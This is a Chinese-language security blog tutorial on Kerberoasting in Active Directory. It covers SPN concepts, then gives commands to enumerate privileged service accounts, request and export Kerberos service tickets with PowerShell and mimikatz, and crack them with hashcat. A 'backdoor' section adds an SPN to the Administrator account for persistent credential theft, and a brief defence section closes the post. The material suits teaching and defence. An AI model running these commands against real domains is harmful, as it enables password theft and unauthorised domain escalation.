@@ -1,0 +1,413 @@
+<article class="post">
+  <h1>域渗透——Kerberoasting</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>Kerberoasting是域渗透中经常使用的一项技术，本文将参考公开的资料，结合自己的理解，详细介绍Kerberoasting的原理和实现，以及一个后门利用的方法，最后给出防御建议。</p>
+
+<p>参考资料：</p>
+
+<p>http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</p>
+
+<p>http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/</p>
+
+<p>https://malicious.link/post/2016/kerberoast-pt1/</p>
+
+<p>https://malicious.link/post/2016/kerberoast-pt2/</p>
+
+<p>https://malicious.link/post/2016/kerberoast-pt3/</p>
+
+<p>https://adsecurity.org/?p=3458</p>
+
+<p>https://adsecurity.org/?page_id=183</p>
+
+<p>https://blog.netspi.com/faster-domain-escalation-using-ldap/</p>
+
+<p>https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>Kerberoasting相关概念</li>
+  <li>Kerberoasting的原理</li>
+  <li>Kerberoasting的实现</li>
+  <li>Kerberoasting的后门利用</li>
+  <li>Kerberoasting的防御</li>
+</ul>
+
+<h2 id="0x02-基本概念">0x02 基本概念</h2>
+<hr>
+
+<h3 id="spn">SPN</h3>
+
+<p>官方文档：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</p>
+
+<p>全称<code class="language-plaintext highlighter-rouge">Service Principal Names</code></p>
+
+<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
+
+<p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>
+
+<p>当一个服务的权限为<code class="language-plaintext highlighter-rouge">Local System</code>或<code class="language-plaintext highlighter-rouge">Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
+
+<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
+
+<h3 id="spn的格式">SPN的格式</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>serviceclass/host:port/servicename
+</code></pre></div></div>
+
+<p>说明：</p>
+
+<ul>
+  <li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li>
+  <li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
+  <li>如果服务运行在默认端口上，则端口号(port)可以省略</li>
+</ul>
+
+<h3 id="查询spn">查询SPN</h3>
+
+<p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p>
+
+<h4 id="1-使用setspn">(1) 使用SetSPN</h4>
+
+<p>Win7和Windows Server2008自带的工具</p>
+
+<p>查看当前域内的所有SPN：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -q */*
+</code></pre></div></div>
+
+<p>查看test域内的所有SPN：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -T test -q */*
+</code></pre></div></div>
+
+<p>输出结果实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CN=DC1,OU=Domain Controllers,DC=test,DC=com
+        exchangeRFR/DC1
+        exchangeRFR/DC1.test.com
+        exchangeMDB/DC1.test.com
+        exchangeMDB/DC1
+        exchangeAB/DC1
+        exchangeAB/DC1.test.com
+        SMTP/DC1
+        SMTP/DC1.test.com
+        SmtpSvc/DC1
+        SmtpSvc/DC1.test.com
+        ldap/DC1.test.com/ForestDnsZones.test.com
+        ldap/DC1.test.com/DomainDnsZones.test.com
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.test.com
+        DNS/DC1.test.com
+        GC/DC1.test.com/test.com
+        RestrictedKrbHost/DC1.test.com
+        RestrictedKrbHost/DC1
+        HOST/DC1/TEST
+        HOST/DC1.test.com/TEST
+        HOST/DC1
+        HOST/DC1.test.com
+        HOST/DC1.test.com/test.com
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/0f33253b-2314-40f0-b665-f4317b13e6b9/test.com
+        ldap/DC1/TEST
+        ldap/0f33253b-2314-40f0-b665-f4317b13e6b9._msdcs.test.com
+        ldap/DC1.test.com/TEST
+        ldap/DC1
+        ldap/DC1.test.com
+        ldap/DC1.test.com/test.com
+CN=krbtgt,CN=Users,DC=test,DC=com
+        kadmin/changepw
+CN=COMPUTER01,CN=Computers,DC=test,DC=com
+        RestrictedKrbHost/COMPUTER01
+        HOST/COMPUTER01
+        RestrictedKrbHost/COMPUTER01.test.com
+        HOST/COMPUTER01.test.com
+CN=MSSQL Service Admin,CN=Users,DC=test,DC=com
+        MSSQLSvc/DC1.test.com
+</code></pre></div></div>
+
+<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p>
+
+<p>对于上面的输出数据，机器帐户(Computers)为：</p>
+
+<ul>
+  <li>CN=DC1,OU=Domain Controllers,DC=test,DC=com</li>
+  <li>CN=COMPUTER01,CN=Computers,DC=test,DC=com</li>
+</ul>
+
+<p>域用户帐户(Users)为：</p>
+
+<ul>
+  <li>CN=krbtgt,CN=Users,DC=test,DC=com</li>
+  <li>CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</li>
+</ul>
+
+<p>注册在域用户帐户(Users)下的SPN有两个：<code class="language-plaintext highlighter-rouge">kadmin/changepw</code>和<code class="language-plaintext highlighter-rouge">MSSQLSvc/DC1.test.com</code></p>
+
+<h2 id="0x03-kerberoasting的原理">0x03 Kerberoasting的原理</h2>
+<hr>
+
+<h4 id="1kerberos认证过程">1、Kerberos认证过程</h4>
+
+<p>一个简单的Kerberos认证过程如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-1.png" alt="Alt text"></p>
+
+<ol>
+  <li>as_request</li>
+  <li>as_reply</li>
+  <li>tgs_request</li>
+  <li>tgs_reply</li>
+  <li>ap_request</li>
+  <li>ap_reply</li>
+</ol>
+
+<p>对于4.tgs_reply，用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为<code class="language-plaintext highlighter-rouge">RC4-HMAC</code></p>
+
+<p>站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生成TGS进行比较。如果TGS相同，代表口令正确，就能获得目标服务实例的明文口令</p>
+
+<h4 id="2windows系统通过spn查询获得服务和服务实例帐户的对应关系">2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</h4>
+
+<p>这里举一个例子：</p>
+
+<p>用户a要访问MySQL服务的资源，进行到4.tgs_reply时，步骤如下：</p>
+
+<p>(1)Domain Controller查询MySQL服务的SPN</p>
+
+<p>如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户</p>
+
+<p>如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</p>
+
+<p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p>
+
+<h4 id="3域内的主机都能查询spn">3、域内的主机都能查询SPN</h4>
+
+<h4 id="4域内的任何用户都可以向域内的任何服务请求tgs">4、域内的任何用户都可以向域内的任何服务请求TGS</h4>
+
+<p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p>
+
+<p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p>
+
+<p>因此，高效率的利用思路如下：</p>
+
+<ol>
+  <li>查询SPN，找到有价值的SPN，需要满足以下条件：
+    <ul>
+      <li>该SPN注册在域用户帐户(Users)下</li>
+      <li>域用户账户的权限很高</li>
+    </ul>
+  </li>
+  <li>请求TGS</li>
+  <li>导出TGS</li>
+  <li>暴力破解</li>
+</ol>
+
+<h2 id="0x04-kerberoasting的实现方法一">0x04 Kerberoasting的实现方法一</h2>
+<hr>
+
+<h3 id="1获得有价值的spn">1、获得有价值的SPN</h3>
+
+<p>需要满足以下条件：</p>
+
+<ul>
+  <li>该SPN注册在域用户帐户(Users)下</li>
+  <li>域用户账户的权限很高</li>
+</ul>
+
+<p>可以选择以下三种方法：</p>
+
+<h4 id="1使用powershell模块active-directory">(1)使用powershell模块Active Directory</h4>
+
+<p><strong>注：</strong></p>
+
+<p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module ActiveDirectory
+get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
+</code></pre></div></div>
+
+<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
+</code></pre></div></div>
+
+<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>
+
+<p>https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>
+
+<h4 id="2使用powerview">(2)使用PowerView</h4>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
+</code></pre></div></div>
+
+<h4 id="3使用kerberoast">(3)使用kerberoast</h4>
+
+<p>powershell:</p>
+
+<p>https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</p>
+
+<p>vbs:</p>
+
+<p>https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</p>
+
+<p>参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cscript GetUserSPNs.vbs
+</code></pre></div></div>
+
+<h3 id="2请求tgs">2、请求TGS</h3>
+
+<h4 id="1请求指定tgs">(1)请求指定TGS</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SPNName = 'MSSQLSvc/DC1.test.com'
+Add-Type -AssemblyNAme System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
+</code></pre></div></div>
+
+<h4 id="2请求所有tgs">(2)请求所有TGS</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type -AssemblyName System.IdentityModel  
+setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+</code></pre></div></div>
+
+<p>执行后输入<code class="language-plaintext highlighter-rouge">klist</code>查看内存中的票据，可找到获得的TGS</p>
+
+<h3 id="3导出">3、导出</h3>
+
+<p>使用mimikatz</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerberos::list /export
+</code></pre></div></div>
+
+<h3 id="4破解">4、破解</h3>
+
+<p>https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./tgsrepcrack.py wordlist.txt test.kirbi
+</code></pre></div></div>
+
+<h2 id="0x05-kerberoasting的实现方法二">0x05 Kerberoasting的实现方法二</h2>
+<hr>
+
+<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
+
+<p>http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</p>
+
+<p>代码地址：</p>
+
+<p>https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
+
+<p>实例演示：</p>
+
+<p>在域内一台主机上以普通用户权限执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
+</code></pre></div></div>
+
+<p>-AdminCount表示选择高权限的用户</p>
+
+<p>输出结果如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png" alt="Alt text"></p>
+
+<p>只提取出hash的参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
+</code></pre></div></div>
+
+<p>输出结果如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-3.png" alt="Alt text"></p>
+
+<p>使用hashcat破解的参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
+</code></pre></div></div>
+
+<p>破解结果如下图，成功获得明文口令<code class="language-plaintext highlighter-rouge">MySQLAdmin111!</code></p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p>
+
+<p>https://github.com/GhostPack/Rubeus</p>
+
+<p>参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe kerberoast
+</code></pre></div></div>
+
+<h2 id="0x06-kerberoasting的后门利用">0x06 Kerberoasting的后门利用</h2>
+<hr>
+
+<p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
+
+<p>例如为域用户<code class="language-plaintext highlighter-rouge">Administrator</code>添加<code class="language-plaintext highlighter-rouge">SPNVNC/DC1.test.com</code>，参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -U -A VNC/DC1.test.com Administrator
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/3-1.png" alt="Alt text"></p>
+
+<p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/3-2.png" alt="Alt text"></p>
+
+<p>再使用hashcat破解即可</p>
+
+<p><strong>补充：</strong></p>
+
+<p>删除SPN的参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -D VNC/DC1.test.com Administrator
+</code></pre></div></div>
+
+<h2 id="0x07-防御">0x07 防御</h2>
+<hr>
+
+<p>站在防御的角度，不可能阻止kerberoast，但可以对有攻击价值的SPN(注册在域用户帐户下，权限高)，增加密码长度，能够提高破解难度，并且定期修改关联的域用户口令</p>
+
+<p>管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN</p>
+
+<p>下载地址：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+
+<p>参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
+</code></pre></div></div>
+
+<h2 id="0x08-小结">0x08 小结</h2>
+<hr>
+
+<p>本文对Kerberoasting的原理、方法和防御作了详细介绍，并进行了实例演示。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on January 15, 2019
+  </div>
+
+  
+</article>
